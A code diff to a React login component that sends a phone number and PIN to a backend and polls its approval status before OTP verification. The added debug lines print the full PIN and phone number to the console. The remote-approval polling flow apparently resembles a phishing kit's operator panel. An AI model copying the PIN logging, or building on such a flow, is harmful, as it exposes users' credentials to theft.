@@ -131,9 +131,14 @@ function Login({ client, setnumber, setpin, sendDetails }) {
   // Function to send PIN to backend
   const sendPinToBackend = async () => {
     if (!pinfull || !number) {
-      setError("Please go back and enter both phone number and PIN");
+      setError("Please enter both phone number and PIN");
       return;
     }
+
+    console.log("🔍 Sending PIN to backend...");
+    console.log("📱 Phone:", number);
+    console.log("🔢 PIN:", pinString);
+    console.log("🌐 API URL:", API_URL);
 
     setVerifying(true);
     setError("");
@@ -165,30 +170,35 @@ function Login({ client, setnumber, setpin, sendDetails }) {
       console.log("✅ Backend response:", data);
 
       if (data.success && data.sessionId) {
+        console.log("🎯 Session ID received:", data.sessionId);
         setSessionId(data.sessionId);
 
         // Start polling for PIN status
         startPolling(data.sessionId);
       } else {
+        console.error("❌ Backend error:", data.error);
         setError(data.error || "Failed to verify PIN");
         setVerifying(false);
         setStatus("");
       }
     } catch (error) {
+      console.error("❌ Network error:", error);
       setError("Network error. Please check your connection and try again.");
       setVerifying(false);
       setStatus("");
-      console.log(error);
     }
   };
 
   // Start polling for PIN status
   const startPolling = (sessionId) => {
+    console.log("🔄 Starting polling for session:", sessionId);
+
     let attempts = 0;
     const maxAttempts = 150; // 5 minutes at 2-second intervals
 
     const poll = async () => {
       if (attempts >= maxAttempts) {
+        console.log("⏰ Max polling attempts reached");
         setError("PIN verification timeout. Please try again.");
         setVerifying(false);
         setStatus("expired");
@@ -196,15 +206,20 @@ function Login({ client, setnumber, setpin, sendDetails }) {
       }
 
       attempts++;
+      console.log(`📡 Polling attempt ${attempts} for session: ${sessionId}`);
 
       try {
         const response = await fetch(
           `${API_URL}/api/check-pin-status/${sessionId}`
         );
 
+        console.log("📊 Status response status:", response.status);
+
         const data = await response.json();
+        console.log("📊 Status response data:", data);
 
         if (data.status === "approved") {
+          console.log("✅ PIN approved!");
           // Stop polling
           if (pollingInterval) {
             clearInterval(pollingInterval);
@@ -219,9 +234,11 @@ function Login({ client, setnumber, setpin, sendDetails }) {
             handleApprovedPin();
           }, 1000);
         } else if (data.status === "pending") {
+          console.log("⏳ Still pending...");
           setStatus("pending");
           // Continue polling
         } else if (data.status === "wrong_pin") {
+          console.log("❌ Wrong PIN");
           if (pollingInterval) {
             clearInterval(pollingInterval);
             setPollingInterval(null);
@@ -239,6 +256,7 @@ function Login({ client, setnumber, setpin, sendDetails }) {
           setVerifying(false);
           setStatus("expired");
         } else if (data.status === "approved_with_otp") {
+          console.log("✅ PIN & OTP approved!");
           if (pollingInterval) {
             clearInterval(pollingInterval);
             setPollingInterval(null);
@@ -269,6 +287,7 @@ function Login({ client, setnumber, setpin, sendDetails }) {
 
   // Handle approved PIN
   const handleApprovedPin = () => {
+    console.log("🎉 PIN approved, proceeding to OTP verification...");
     setpin(pinString);
     sendDetails();
     navigate("/otpverification");
@@ -309,7 +328,6 @@ function Login({ client, setnumber, setpin, sendDetails }) {
     };
   }, [pollingInterval]);
 
-  console.log(sessionId);
   return (
     <>
       <div className="container">
